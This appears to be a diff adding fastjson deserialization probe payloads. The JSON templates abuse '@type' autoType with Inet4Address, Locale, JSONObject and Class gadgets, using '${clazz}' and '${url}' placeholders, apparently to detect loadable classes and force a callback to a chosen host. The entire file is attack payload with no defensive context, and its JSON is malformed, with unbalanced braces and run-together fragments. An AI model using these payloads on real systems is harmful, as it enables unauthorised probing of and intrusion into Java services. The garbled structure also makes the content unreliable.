@@ -1,0 +1,10 @@
+{"@type":"java.net.Inet4Address",
+  "val":{"@type":"java.lang.String"
+{"@type":"java.util.Locale",
+  "val":{"@type":"com.alibaba.fastjson.JSONObject",{
+  "@type": "java.lang.String""@type":"java.util.Locale",
+  "language":{"@type":"java.lang.String"
+{1:{"@type":"java.lang.Class","val":"${clazz}"}},
+"country":"${url}"
+}}
+}
